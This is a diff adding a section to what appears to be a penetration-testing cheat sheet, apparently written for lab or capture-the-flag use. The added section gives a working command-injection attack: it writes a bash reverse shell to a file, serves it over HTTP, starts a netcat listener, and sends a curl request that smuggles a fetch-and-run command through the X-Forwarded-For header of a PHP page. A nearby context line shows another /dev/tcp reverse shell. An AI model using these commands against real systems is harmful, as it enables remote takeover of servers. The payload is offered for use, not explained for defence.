@@ -26,6 +26,21 @@ Python virtual environments mess with `$PATH`. Always use full paths:
 # not just: bash -i >& /dev/tcp/...
 ```
 
+## Fetch and execute shell using Web request
+
+```
+# Terminal:
+echo 'bash -i >& /dev/tcp/10.10.14.50/4444 0>&1' > shell.sh
+python3 -m http.server 8000
+
+nc -lvnp 4444
+
+# Web request:
+curl 'http://RHOST/firewall.php' \
+  -H 'Cookie: PHPSESSID=7sjgc79l18h0vhcb64cq7m5oe3' \
+  -H $'X-Forwarded-For: 127.0.0.1;curl http://YOUR-IP:8000/shell.sh -o /tmp/s && bash /tmp/s'
+
+```
 
 ## Remote Desktop & Connection Tools
 
